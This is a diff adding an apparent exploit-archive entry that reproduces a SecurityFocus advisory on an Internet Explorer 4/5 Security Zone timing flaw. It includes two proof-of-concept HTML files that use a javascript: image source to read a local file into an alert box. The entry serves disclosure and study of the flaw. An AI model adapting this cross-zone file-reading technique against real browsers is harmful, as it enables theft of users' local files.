@@ -1,0 +1,21 @@
+Microsoft Internet Explorer 4.0 for Windows 3.1/Windows 95,Internet Explorer 5.0 for Windows 2000/Windows 95/Windows 98/Windows NT 4,Internet Explorer 5.5 preview,Internet Explorer 4.0.1 for Windows 98/Windows NT 4.0,Internet Explorer 5.0.1 Security Zone Settings Lag Vulnerability
+
+source: http://www.securityfocus.com/bid/923/info
+
+When a new document is loaded into an IE window, IE will not update the Security Zone settings for that window until the new document is completely loaded. This means that if a local document is loaded, and then a large remote document is loaded that has JavaScript at the very beginning, the JavaScript may load and execute before the Security Zone settings are updated. This could lead to remote and untrusted JavaScript running as local trusted code, with full access to local files, cookies, etc.
+
+
+-----------------img2main.html---------------------------------------
+<A HREF="img2.html" TARGET="victim">link</A>
+<SCRIPT>
+alert("Create a short text file C:\\test.txt and it will be read and shown in a message box");
+a=window.open("file://c:/test.txt","victim");
+setTimeout("document.links[0].click()",2000);
+</SCRIPT>
+---------------------------------------------------------------------
+
+----------------img2.html--------------------------------------------
+<HTML>
+<IMG SRC="javascript:a=window.open('javascript:alert(\'Here is your file: \'+opener.document.body.innerText)');alert('Just an alert, but is necessary. Wait a little.')">
+</HTML>
+---------------------------------------------------------------------
